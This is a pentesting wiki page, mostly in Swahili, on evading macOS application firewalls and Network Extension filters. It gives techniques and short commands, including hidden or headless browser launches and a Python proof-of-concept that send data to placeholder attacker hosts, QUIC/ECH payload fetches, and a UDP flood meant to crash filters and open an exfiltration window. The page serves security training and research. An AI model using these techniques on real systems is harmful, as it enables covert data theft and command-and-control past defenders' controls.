# macOS Bypassing Firewalls

{{#include ../../banners/hacktricks-training.md}}

## Mbinu zilizopatikana

Mbinu zifuatazo zilipatikana zikifanya kazi katika baadhi ya firewall apps za macOS.

### Abusing whitelist names

- Kwa mfano, kuita malware kwa majina ya processes zinazojulikana za macOS kama **`launchd`**

### Synthetic Click

- Ikiwa firewall itaomba ruhusa kutoka kwa mtumiaji, ifanye malware **ibofye allow**

### **Use Apple signed binaries**

- Kama **`curl`**, lakini pia nyingine kama **`whois`**

### Well known apple domains

Firewall inaweza kuruhusu connections kwenye apple domains zinazojulikana kama **`apple.com`** au **`icloud.com`**. Pia iCloud inaweza kutumiwa kama C2.

### Generic Bypass

Baadhi ya mawazo ya kujaribu ili kubypass firewalls

### Check allowed traffic

Kujua traffic inayoruhusiwa kutakusaidia kutambua domains ambazo huenda ziko kwenye whitelist au ni applications zipi zimeruhusiwa kuzifikia
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Kutumia vibaya DNS

Utafutaji wa DNS hufanywa kupitia **`mdnsreponder`** signed application ambayo huenda ikaruhusiwa kuwasiliana na DNS servers.<sup>[1]</sup>

<figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Kupitia Browser apps

- **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
- Google Chrome
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
- Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
- Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Kupitia processes injections

If you can **inject code into a process** that is allowed to connect to any server you could bypass the firewall protections:


{{#ref}}
macos-proces-abuse/
{{#endref}}

---

## Recent macOS firewall bypass vulnerabilities (2023-2025)

### Web content filter (Screen Time) bypass – **CVE-2024-44206**
Mnamo Julai 2024 Apple ilirekebisha bug muhimu katika Safari/WebKit iliyoharibu “Web content filter” ya mfumo mzima inayotumiwa na vidhibiti vya wazazi vya Screen Time.
URI iliyoundwa mahsusi (kwa mfano, yenye “://” iliyowekwa URL-encode mara mbili) haitambuliwi na Screen Time ACL lakini inakubaliwa na WebKit, hivyo request hutumwa nje bila kuchujwa. Kwa hiyo, process yoyote inayoweza kufungua URL (ikiwemo code iliyo kwenye sandbox au isiyosainiwa) inaweza kufikia domains zilizozuiwa wazi na user au MDM profile.<sup>[2]</sup>

Practical test (un-patched system):
```bash
open "http://attacker%2Ecom%2F./"   # should be blocked by Screen Time
# if the patch is missing Safari will happily load the page
```
### Hitilafu ya mpangilio wa rule za Packet Filter (PF) katika macOS 14 “Sonoma” ya awali
Katika kipindi cha beta cha macOS 14, Apple ilianzisha regression katika userspace wrapper inayozunguka **`pfctl`**.
Rules zilizoongezwa kwa keyword ya `quick` (inayotumiwa na VPN kill-switches nyingi) zilipuuzwa kimya kimya, na kusababisha traffic leaks hata GUI ya VPN/firewall iliporipoti *blocked*. Hitilafu hii ilithibitishwa na VPN vendors kadhaa na kurekebishwa katika RC 2 (build 23A344).

Quick leak-check:
```bash
pfctl -sr | grep quick       # rules are present…
sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
```
### Kutumia vibaya huduma saidizi zilizotiwa saini na Apple (legacy – pre-macOS 11.2)
Kabla ya macOS 11.2, **`ContentFilterExclusionList`** iliruhusu takriban binary 50 za Apple, kama vile **`nsurlsessiond`** na App Store, kupita firewalls zote za socket-filter zilizotekelezwa kwa kutumia mfumo wa Network Extension (LuLu, Little Snitch, n.k.).
Malware ingeweza kuanzisha mchakato uliotengwa—au kuingiza code ndani yake—na kuelekeza traffic yake kupitia socket ambayo tayari imeruhusiwa. Apple iliondoa kabisa exclusion list katika macOS 11.2, lakini technique hii bado inahusika kwenye systems ambazo haziwezi ku-upgrade.<sup>[3]</sup>

Mfano wa proof-of-concept (pre-11.2):
```python
import subprocess, socket
# Launch excluded App Store helper (path collapsed for clarity)
subprocess.Popen(['/System/Applications/App\\ Store.app/Contents/MacOS/App Store'])
# Connect through the inherited socket
s = socket.create_connection(("evil.server", 443))
s.send(b"exfil...")
```
### QUIC/ECH za kukwepa Network Extension domain filters (macOS 12+)
NEFilter Packet/Data Providers hutegemea TLS ClientHello SNI/ALPN. Kwa **HTTP/3 over QUIC (UDP/443)** na **Encrypted Client Hello (ECH)**, SNI hubaki ikiwa imesimbwa kwa njia fiche, NetExt haiwezi kuchanganua mtiririko, na hostname rules mara nyingi huwa fail-open, hivyo malware inaweza kufikia domains zilizozuiwa bila kugusa DNS.<sup>[5]</sup>

Minimal PoC:
```bash
# Chrome/Edge – force HTTP/3 and ECH
/Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome \
--enable-quic --origin-to-force-quic-on=attacker.com:443 \
--enable-features=EncryptedClientHello --user-data-dir=/tmp/h3test \
https://attacker.com/payload

# cURL 8.10+ built with quiche
curl --http3-only https://attacker.com/payload
```
Ikiwa QUIC/ECH bado imewezeshwa, hii ni njia rahisi ya kukwepa hostname-filter.

### macOS 15 “Sequoia” Network Extension kutokuwa thabiti (2024–2025)
Build za awali za 15.0/15.1 hu-crash third-party **Network Extension** filters (LuLu, Little Snitch, Defender, SentinelOne, n.k.). Filter inapoanza tena, macOS huondoa flow rules zake na bidhaa nyingi hushindwa kwa hali ya fail-open. Kufurika filter kwa maelfu ya short UDP flows (au kulazimisha QUIC/ECH) kunaweza kusababisha crash mara kwa mara na kuacha dirisha la C2/exfil, huku GUI ikiendelea kudai kuwa firewall inaendeshwa.<sup>[4]</sup>

Reproduction ya haraka (safe lab box):
```bash
# create many short UDP flows to exhaust NE filter queues
python3 - <<'PY'
import socket, os
for i in range(5000):
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(b'X'*32, ('1.1.1.1', 53))
PY
# watch for NetExt crash / reconnect loop
log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslog
```
---

## Vidokezo vya kutumia zana kwenye macOS za kisasa

1. Kagua sheria za sasa za PF zinazozalishwa na firewall za GUI:
```bash
sudo pfctl -a com.apple/250.ApplicationFirewall -sr
```
2. Orodhesha binaries ambazo tayari zina entitlement ya *outgoing-network* (inafaa kwa piggy-backing):
```bash
codesign -d --entitlements :- /path/to/bin 2>/dev/null \
| plutil -extract com.apple.security.network.client xml1 -o - -
```
3. Sajili programmatically content filter yako ya Network Extension kwa Objective-C/Swift.
PoC ndogo ya rootless inayotuma packets kwenye socket ya ndani inapatikana katika source code ya **LuLu** ya Patrick Wardle.

## Marejeo

- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: Kutengeneza na Kuvunja Firewalls za macOS](https://www.youtube.com/watch?v=UlT5KFTMn2k)
- [2] [Apple web content filter bypass inaruhusu ufikiaji usio na vizuizi wa maudhui yaliyofungwa (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
- [3] [Apple Yaondoa Kipengele cha macOS Kilichoruhusu Apps Kupita Usalama wa Firewall - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
- [4] [Bidhaa za Cybersecurity Zikisitisha Kufanya Kazi Baada ya Sasisho la macOS Sequoia - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
- [5] [Tumia ulinzi wa mtandao kusaidia kuzuia miunganisho ya macOS kwenye tovuti hatari - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)

{{#include ../../banners/hacktricks-training.md}}
